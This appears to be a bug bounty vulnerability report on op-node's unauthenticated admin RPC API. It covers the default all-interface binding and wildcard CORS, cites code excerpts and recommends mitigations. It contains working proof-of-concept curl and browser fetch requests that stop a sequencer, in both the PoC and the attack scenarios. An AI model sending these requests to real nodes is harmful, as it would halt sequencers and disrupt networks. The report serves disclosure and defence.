# VULN-001: Unauthenticated Admin API in op-node

## Severity
**CRITICAL**

## Component
op-node

## Vulnerability Type
- CWE-306: Missing Authentication for Critical Function
- CWE-284: Improper Access Control

## Description
The op-node admin API exposes critical operational functions without any authentication mechanism. When enabled via `--rpc.enable-admin`, the admin namespace becomes accessible to anyone who can reach the RPC endpoint.

**CRITICAL AGGRAVATING FACTORS:**
1. **Default 0.0.0.0 Binding:** RPC server binds to ALL network interfaces by default, not localhost
2. **CORS Wide Open:** All origins (`*`) are allowed for cross-origin requests
3. **No Authentication:** Admin functions have no authentication layer

This combination makes the admin API remotely exploitable when enabled.

## Affected Code Locations
- `/home/user/optimism/op-node/node/api.go` lines 49-103 (Admin API implementation)
- `/home/user/optimism/op-node/node/node.go` lines 477-482 (Admin API registration)
- `/home/user/optimism/op-node/flags/flags.go` line 482 (0.0.0.0 default binding)
- `/home/user/optimism/op-node/node/server.go` line 17 (CORS wildcard)

## Vulnerable Functions
The following critical functions are exposed without authentication:

1. **`admin_postUnsafePayload`** (line 81-89): Allows posting unsafe L2 payloads directly to the derivation pipeline
   - Intended only for op-conductor failover scenarios
   - Could be used to inject malicious or invalid payloads

2. **`admin_startSequencer`** (line 67-69): Starts the sequencer
   - Can cause the node to begin producing blocks

3. **`admin_stopSequencer`** (line 71-73): Stops the sequencer
   - Denial of service vector

4. **`admin_resetDerivationPipeline`** (line 63-65): Resets the entire derivation pipeline
   - Could cause state inconsistencies

5. **`admin_overrideLeader`** (line 92-94): Disables conductor and forces non-HA mode
   - Intended for disaster recovery only
   - Bypasses high-availability safety mechanisms

## Proof of Concept

```bash
# If admin API is enabled and exposed
curl -X POST http://node-ip:port \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "method": "admin_stopSequencer",
    "params": [],
    "id": 1
  }'
```

## Exploitation Scenario

### Scenario 1: Direct Remote Attack (Most Severe)
1. Operator enables admin API for operational needs (`--rpc.enable-admin`)
2. **RPC binds to 0.0.0.0:9545 by default** (all interfaces)
3. Attacker scans network and finds exposed RPC port
4. Attacker makes direct RPC calls to admin functions:
   ```bash
   curl -X POST http://victim-node:9545 \
     -H "Content-Type: application/json" \
     -d '{"jsonrpc":"2.0","method":"admin_stopSequencer","params":[],"id":1}'
   ```
5. Sequencer halted, network disrupted

### Scenario 2: Browser-Based CSRF Attack
1. Admin API enabled and accessible on internal network
2. **CORS set to `*` allows any origin**
3. Attacker tricks operator into visiting malicious website
4. Malicious JavaScript makes cross-origin requests:
   ```javascript
   fetch('http://internal-node:9545', {
     method: 'POST',
     body: JSON.stringify({
       jsonrpc: '2.0',
       method: 'admin_stopSequencer',
       params: [],
       id: 1
     })
   })
   ```
5. Attack succeeds despite browser same-origin policy

## Impact
- **Denial of Service**: Ability to stop sequencer operations
- **Chain Manipulation**: Injection of unsafe payloads
- **Safety Bypass**: Disabling of conductor HA mechanisms
- **Operational Disruption**: Pipeline resets causing sync issues

## Evidence

### 1. Admin API Exposed Without Authentication
From `/home/user/optimism/op-node/node/node.go:477-482`:
```go
if cfg.RPC.EnableAdmin {
    server.AddAPI(rpc.API{
        Namespace: "admin",
        Service:   NewAdminAPI(n.l2Driver, n.log),
    })
    n.log.Info("Admin RPC enabled")
}
```
No authentication layer is added. The admin API is directly exposed.

### 2. Default Binding to All Interfaces
From `/home/user/optimism/op-node/flags/flags.go:481-484`:
```go
var rpcDefaults = oprpc.CLIConfig{
    ListenAddr:  "0.0.0.0", // TODO(#16487): Switch to 127.0.0.1
    ListenPort:  9545,
    EnableAdmin: false,
}
```
**RPC server binds to 0.0.0.0 by default!** There's even a TODO to fix this (#16487).

### 3. CORS Wildcard Enabled
From `/home/user/optimism/op-node/node/server.go:15-18`:
```go
server := oprpc.NewServer(rpcCfg.ListenAddr, rpcCfg.ListenPort, appVersion,
    oprpc.WithLogger(log),
    oprpc.WithCORSHosts([]string{"*"}), // CORS is not important on op-node...
    oprpc.WithRPCRecorder(metrics.NewRecorder("main")),
)
```
All origins are allowed, enabling CSRF attacks.

From `/home/user/optimism/op-node/node/api.go:79-89`:
```go
// PostUnsafePayload is a special API that allows posting an unsafe payload to the L2 derivation pipeline.
// It should only be used by op-conductor for sequencer failover scenarios.
func (n *adminAPI) PostUnsafePayload(ctx context.Context, envelope *eth.ExecutionPayloadEnvelope) error {
    payload := envelope.ExecutionPayload
    if actual, ok := envelope.CheckBlockHash(); !ok {
        log.Error("payload has bad block hash", "bad_hash", payload.BlockHash.String(), "actual", actual.String())
        return fmt.Errorf("payload has bad block hash: %s, actual block hash is: %s", payload.BlockHash.String(), actual.String())
    }

    return n.dr.OnUnsafeL2Payload(ctx, envelope)
}
```

Comment explicitly states this "should only be used by op-conductor" but there's no enforcement.

## Recommended Mitigations

### Immediate
1. **Network-level restriction**: Ensure admin RPC is ONLY bound to localhost
   - Default config should use `--rpc.admin.addr=127.0.0.1`
   - Firewall rules to block external access

2. **Deployment documentation**: Clear warnings about admin API exposure risks

### Long-term
1. **Add authentication**: Implement JWT or API key authentication for admin namespace
2. **Mutual TLS**: Require client certificates for admin API access
3. **IP allowlist**: Configuration option to restrict admin API to specific IPs
4. **Audit logging**: Log all admin API calls with source IP and timestamp
5. **Rate limiting**: Prevent brute-force attempts

## Verification Status
**VERIFIED** - Confirmed by code review:
- Admin API has no authentication mechanism in place
- Flag enables it on the configured RPC server without additional security
- Comments indicate functions are intended for restricted use but not enforced

## References
- op-node/node/api.go (admin API implementation)
- op-node/node/node.go (RPC server setup)
- op-node/flags/flags.go:484 (EnableAdmin flag default: false)

## Bug Bounty Submission Notes
- This vulnerability requires the admin API to be enabled (not default)
- However, operators may enable it for legitimate operational needs
- No defense-in-depth measures exist when enabled
- Critical impact if exploited
